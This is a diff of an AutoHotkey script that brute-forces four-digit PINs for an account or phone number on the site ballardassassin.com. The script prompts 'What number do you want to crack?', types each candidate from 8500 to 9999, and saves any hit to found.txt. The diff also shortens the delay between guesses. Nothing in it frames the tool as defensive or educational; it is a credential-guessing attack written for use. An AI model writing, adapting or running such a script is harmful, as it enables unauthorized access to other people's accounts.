@@ -3,36 +3,16 @@
 SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
 SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory
 	
-^Numpad0::
+^l::
 	;WinGetText text, A
 	;MsgBox %text%
-	ExitApp 0
+	Run internetexplorer.exe ballardassassin.com
 return
 
 ^m::
-	InputBox accountnumber, "Phone number prompt", "What number do you want to crack?"
-	CoordMode, Mouse, Screen
-	Run, "C:\Program Files\Internet Explorer\iexplore.exe" ballardassassin.com
-	Sleep 3000
-	MouseClick, Left, 910, 760, 1, 0
-	Sleep 1500
-	MouseClick, Left, 675, 327, 2, 0
-	Send %accountnumber%
-	MouseClick, Left, 675, 750, 1, 0
-	Sleep 2500
-	failCheck := "OK"
-	WinGetText failCheckText, A
-	if InStr(failCheckText, failCheck)
-	{
-		
-		MsgBox No!
-		ExitApp 1
-	}
-	else
-	{
-	MouseClick, Left, 675, 327, 1, 0
-	start=0000
+	start=8500
 	finish=9999
+	InputBox accountnumber, "Phone number prompt", "What number do you want to crack?"
 	Loop %finish%
 	{
 		if start < 10
@@ -67,14 +47,12 @@ return
 			`n
 			%boof%
 			), found.txt
-			resultant := "found it" + "`n" + %accountnumber% + "`n" + %boof%
-			MsgBox, Ok, Result, %resultant%
+			MsgBox found it!
 			Break
 		}
 		start++
-		Sleep 50
+		Sleep 25
 		Send `b`b`b`b
-	}
 	}
 	Exit 0
 return
